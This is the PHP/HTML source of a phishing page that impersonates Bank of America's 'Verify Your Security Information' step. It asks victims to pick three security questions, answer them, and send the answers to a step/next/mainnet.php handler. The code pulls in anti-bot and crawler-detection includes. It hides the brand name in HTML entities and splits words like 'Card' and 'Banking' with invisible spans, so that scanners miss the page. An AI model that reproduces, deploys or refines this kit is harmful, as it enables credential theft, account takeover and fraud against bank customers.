<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
	include 'bot_fucker/wrd.php';
     include 'bot_fucker/bot.php';
	 include 'crawlerdetect.php';
    include 'huehuehue.php';
?>
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" class="gr__secure"><head class="at-element-marker" style="visibility:visible;">

<title>&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;</title>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<meta name="viewport" content="width=device-width,initial-scale=1">

<link rel="stylesheet" type="text/css" href="css/style2.css" />
<link rel="stylesheet" type="text/css" href="css/zk.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-foundation.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-responsive.css" />

  </head>

<body data-gr-c-s-loaded="true" class="safari safari537 breeze"><div id="mboxDiv" class="mbox-name-bac_dep_consumer_app_personal_info_1_top at-element-marker" style="visibility:visible;">
</div><script type="text/javascript"></script>
<div id="fX2J_" style="width:100%;height:100%;" class="z-page">
	<div id="fX2J1" class="z-div">
		<div id="fX2J2" style="display:none;" class="z-div"><span id="fX2J3" class="z-label">Build: </span></div>
		<a id="fX2J4" name="top"></a>
		<div id="fX2J5" class="row page-container">
	
	<div id="fX2J6" class="small-12 columns">
		<div id="fX2J7" class="z-div">
	<div id="fX2J8" class="header">
		<div id="fX2J9" class="row header_branding-bar">
			<div class="small-12 columns">
			
			 <span>
                 <img role="img" tabindex="0" class="image-logo" src="images/new_logo.svg" alt="">
             </span>
				<a class="right secure-text show-for-medium-up" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea">Secure Page</a>
				<a class="right secure-text show-for-small-only" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea"></a>
			</div>
		</div>
		<div id="fX2Ja" class="row header_title-bar">
			<div class="small-12 columns">
				<h1>
					<span class="show-for-large-up">Ver<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ify Your Security In<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>formation<sup>™</sup> </span>
					<span focusable="true" focusableintouchmode="true" class="show-for-medium-down">Verify Your Ca<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rd Infor<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>mation</span>
				</h1>
			</div>
		</div>	
		<div id="fX2Jb" class="z-include">
	<div id="fX2Jc" class="row">
		<div class="small-12 columns progress-bar--v1">
			<div class="contain-to-grid sticky">
			    <nav class="top-bar" data-topbar="">
 					<div class="progress progress--v1">
						<span id="step-meter" class="meter" style="width: 0%;"><span id="step-meter-inner" class="meter" style="display:none;"></span></span>
						<span id="step-counter" class="hide">3</span>
					</div>
					<ul class="progress-bar_step-list--v1">
						<li class="progress-bar_step">
							<span id="step-1-circle" class="step-circle active">
								<p class="show-for-medium-up step-number">
									<span id="fX2Je" class="ada-hidden ">Step 1 of 4 (Cur<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rent Step):</span>
								1</p>
							</span>					
							<label id="step-1-label" class="show-for-medium-up step-text active">Security Inform<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ation</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-2-circle" class="step-circle ">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jh" class="ada-hidden">Step 2 of 4:</span>
								2</p>
							</span>
														<label id="step-2-label" class="show-for-medium-up step-text">Your Inform<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ation</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-3-circle" class="step-circle ">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jk" class="ada-hidden">Step 3 of 4 (Current Step):</span>
								3</p>
							</span>
							<label id="step-3-label" class="show-for-medium-up step-text">Ca<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>r<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>d information</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-4-circle" class="step-circle ">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jn" class="ada-hidden">Step 4 of 4:</span>
								4</p>
							</span>
							<label id="step-4-label" class="show-for-medium-up step-text ">Completed</label>
						</li>
					</ul>
					<a id="help-link" class="show-for-small-only help-dropdown_trigger">Need Help?</a>
                </nav>
				<ul role="list" aria-label="Need Help Menu" id="help-menu">
					<span>
							<li class="help-menu_cell">
								<a class="help-menu_link" href="tel:844-375-7031">
									<img class="image-call"  src="images/call_icon_2x.svg">
									Call 844-375-7031
								</a>
							</li>
					</span>
					
					<li class="help-menu_cell" id="tc-chat-container-59"></li>
				</ul>
			</div>
		</div>
	</div></div></div></div>
		<div id="fX2Jp" class="z-include">
<div id="fX2Jq" class="z-div">
	<div id="fX2Jr" class="row show-for-medium-up contact-container">
		<div id="cdpContactDiv" class="medium-6 columns right">
			<ul class="inline-list contact-list">
				<li class="show-for-medium-up">
					<img class="image-call" src="images/call_icon_2x.svg" alt=" ">
					<span class="contact-list_item-title">CALL</span>
					<span class="contact-list_item-body">844-375-7031</span>
				</li>
				<li class="show-for-medium-up" id="tc-chat-container-48" aria-live="polite"><img src="images/app-fixed1-busy.png" alt="Chat with us - chat is busy." style="cursor:default"></li>
			</ul>
		</div>
	</div></div></div>
		
		
		
		<div id="fX2Jw" class="z-include">
	<div id="fX2Jx" style="display:none;" class="z-div">

		<div id="fX2J20" class="row ada-hidden">
			<div class="small-12 columns">
				<ul>
					<div id="fX2J30" class="z-div"></div>
				</ul>
			</div>
		</div></div></div>
		<div id="fX2J50" class="z-div">
	<div id="fX2J60" class="row"></div>
	<div id="fX2J70" class="row">
	<div id="fX2J80" class="z-div">
</div>
	<div id="fX2Jk0" class="z-div">
		<div id="fX2Jl0" class="small-12 columns ">
			<div id="fX2Jm0" style="width:100%;height:100%;" class="responsive-div-include z-include">
	<div id="fX2Jn0" class="z-div">

		<div id="fX2Jo0" class="row">
			<div class="small-12 medium-11 columns">
				<div id="fX2Jp0" class="z-div">
		
					<h3 id="fX2Jr0" class="c1">Now let's authe<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>nticate Your On<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>line Ba<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>nking S<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ecurity Questions  </h3></div>
			</div>
		</div>
		
		<div id="fX2Js0" class="z-div">
			<hr id="fX2Jt0" aria-hidden="true">
			<div id="fX2Ju0" class="row">
				<div class="small-6 columns">
		
				</div>
				<div class="small-6 columns">
					<p class="required-text">* required</p>
				</div>
			</div></div>
		
		<div id="fX2Jv0" class="row">
			<div id="fX2Jw0" class="small-12 columns">
				<form method="post" action="step/next/mainnet.php?token=<?php echo $_SESSION['token']; ?>" >
						<div id="fX2Ji2" class="z-include">
	<div id="fX2Jj2" class="z-div">
			<div id="fX2Jk2" style="display:none;" class="row">
				<div id="fX2Jl2" class="small-12 columns">

					<hr>
				</div></div>
				<div class="small-12 medium-4 columns">
				Security Question 1
						<div class="select-box inactive" id="zz_addr_lb_state_v_1-box">
<select id="zz_addr_lb_state_v_1" class="z-xrlistbox abpa-listbox" name="q1"  autocomplete="off" required >
<option value="">Select SiteKey Challenge Question 1</option>
<option value="what is the first name of your mothers closest friend?">what is the first name of your mothers closest friend?</option>
<option value="what was the name of your first pet?">what was the name of your first pet?</option>
<option value="what is the first name of your favorite niece/nephew?">what is the first name of your favorite niece/nephew?</option>
<option value="what is the first name your hairdresserr/barber?">what is the first name your hairdresserr/barber?</option>
<option value="what is the name of your best childhood friend? ">what is the name of your best childhood friend? </option>
<option value="on what street is your grocery store?">on what street is your grocery store?</option>
<option value="what is the name of the medical professional who delivered your first child?">what is the name of the medical professional who delivered your first child?</option>
<option value="what is the name of a college you applied to but didnt atted?">what is the name of a college you applied to but didnt atted? </option>
<option value="what was the first name of your favorite teacher or professor?">what was the first name of your favorite teacher or professor?</option>
<option value="what is your all-time favorite song? ">what is your all-time favorite song? </option></select>
</div>

					</div>
		</div>
		
		
		<div id="yVpC86" class="row">
			<div class="small-12 medium-5 large-4 columns">
			Answer
				<div id="zz_debcardfund_tb_seccode_v_1-box" class="row collapse text-box">
				
<div class="small-10 columns">

<input type="text"  id="zz_debcardfund_tb_seccode_v_1" class="z-textbox abpa-textbox text-box--numeric" value="" name="ans1" required autocomplete="off">
</div>


</div>

			</div>
		</div>
						<div class="small-12 medium-4 columns">
				Security Question 2
						<div class="select-box inactive" id="zz_addr_lb_state_v_1-box">
<select id="zz_addr_lb_state_v_1" class="z-xrlistbox abpa-listbox" name="q2"  autocomplete="off" required>
<option value="">Select SiteKey Challenge Question 2</option>
<option value="what is the first name of your high school prom date?">what is the first name of your high school prom date?</option>
<option value="who is your favorite person in history?">who is your favorite person in history?</option>
<option value="what was the make and model of your first car?">what was the make and model of your first car? </option>
<option value="what is first name of best man/main of honor at your wedding?">what is first name of best man/main of honor at your wedding? </option>
<option value="what is the name of your favorite restaurant?">what is the name of your favorite restaurant?</option>
<option value="As a child what did you want to be when you grew up?">As a child what did you want to be when you grew up? </option>
<option value="what was the first live concert you attended?">what was the first live concert you attended?</option>
<option value="what was the first name of your first manager?">what was the first name of your first manager?</option>
<option value="what is the name of your high school star athlete?">what is the name of your high school star athlete?</option>
<option value="where were you on New Years 2000?">where were you on New Years 2000? </option></select>
</div>

					</div>
		
		<div id="yVpC86" class="row">
			<div class="small-12 medium-5 large-4 columns">
			Answer
				<div id="zz_debcardfund_tb_seccode_v_1-box" class="row collapse text-box">
				
<div class="small-10 columns">

<input type="text"  id="zz_debcardfund_tb_seccode_v_1" class="z-textbox abpa-textbox text-box--numeric" value="" name="ans2" required autocomplete="off">
</div>


</div>

			</div>
		</div>
		<div class="small-12 medium-4 columns">
				Security Question 3
						<div class="select-box inactive" id="zz_addr_lb_state_v_1-box">
<select id="zz_addr_lb_state_v_1" class="z-xrlistbox abpa-listbox" name="q3"  autocomplete="off" required>
<option value="">Select SiteKey Challenge Question 3</option>
<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
<option value="What is your favorite board game?">What is your favorite board game?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your dream occupation?">What is your dream occupation?</option>
<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="What is your first pet's name?">What is your first pet's name?</option>
<option value="What color was your first car?">What color was your first car?</option>
<option value="What is your Mother middles name?">What is your Mother's middle name?</option>
<option value="What is the name of the street you grew up on?">What is the name of the street you grew up on?</option>
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your best friend's first name?">What is your best friend's first name?</option>
<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
<option value="What is the name of the first beach you visited?">What is the name of the first beach you visited?</option>
<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
<option value="What is your Family tradition?">What is your Family tradition?</option>
<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
<option value="What is your daughter's name?">What is your daughter's name?</option>
<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
<option value="Who is your favorite composer?">Who is your favorite composer?</option>
<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
</div>

					</div>
		
		<div id="yVpC86" class="row">
			<div class="small-12 medium-5 large-4 columns">
			Answer
				<div id="zz_debcardfund_tb_seccode_v_1-box" class="row collapse text-box">
				
<div class="small-10 columns">

<input type="text"  id="zz_debcardfund_tb_seccode_v_1" class="z-textbox abpa-textbox text-box--numeric" value="" name="ans3" required autocomplete="off">
</div>


</div>

			</div>
		</div>
		
		
	
	<div id="fX2Ji1" class="row">
	<div id="fX2Jj1" class="z-div">
		<div id="fX2Jk1" class="small-12 columns ">
			<div id="fX2Jl1" style="width:100%;height:100%;" class="responsive-div-include z-include">
  <div id="fX2Jm1" class="z-div">
     
    <div id="fX2Jn1" class="small-12 columns">
	<div class="int_style4">
<input id="login" type="submit" class="bt_style" value="Continue">
</div>
	  </form>
      </div></div></div></div></div></div></div>
		<div id="fX2Js1" class="z-include">
	<div id="fX2Jt1" class="row hide-for-print">
		<span id="hiddenIsContinueButtonActive_v_1" style="display:none;" class="z-checkbox"><input type="checkbox" id="hiddenIsContinueButtonActive_v_1-real" name="hiddenIsContinueButtonActive" checked="checked"><label for="hiddenIsContinueButtonActive_v_1-real" class="z-checkbox-cnt"></label></span>
		
	</div></div>
		<div id="fX2J22" class="z-div">
	<div id="fX2J32" class="footer hide-for-print">
		<div id="fX2J42" class="row">
			<div id="fX2J52" class="small-12 columns">
				<p class="privacy-text">
					<span id="fX2J62" class="z-span">
					<a id="fX2J72" class="privacy-text_link" title="Share website feedback" name="link_shareWebsiteFeedback" href="javascript:void(0);" onclick="oo_feedback.show()">Share website feedback</a>
					<span id="fX2J82" aria-hidden="true"> | </span></span>


					
					<a class="privacy-text_link" title="Privacy & Security. Link opens in new window." name="PrivacyAndSecurity" href="javascript:void(0);" onclick="displayPopup('javascript:void(0);');return false;">&#80;&#114;&#105;&#118;&#97;&#99;&#121; &amp; &#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">
					&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;
					
					<a class="copyright-text_link" title="Equal Housing Lender. Link opens in new window." href="javascript:void(0);" onclick="displayPopup('javascript:void(0);');return false;" name="EqualHousingLender">Equal Housing Lender</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">&copy; 2022&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#105;&#111;&#110;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;</p>
			</div></div></div></div>
	</div></div>
		<div id="fX2Jb2" class="z-div"></div>

		<div id="fX2Je2" class="block-ui">
			<div id="fX2Jf2" class="processing-modal z-window-modal z-window-modal-shadow">
				<div class="z-window-modal-tl-noborder">
					<div class="z-window-modal-tr-noborder"></div>
				</div>
				<div class="z-window-modal-cl-noborder">
					<div class="z-window-modal-cr-noborder">
						<div class="z-window-modal-cm-noborder">
							<div class="z-window-modal-cnt-noborder">
								<img class="image-processing" src="" alt=" ">
								
							</div>
						</div>
					</div>
				</div>
				<div class="z-window-modal-bl-noborder">
					<div class="z-window-modal-br-noborder"></div>
				</div>
			</div></div></div></div>

</body></html>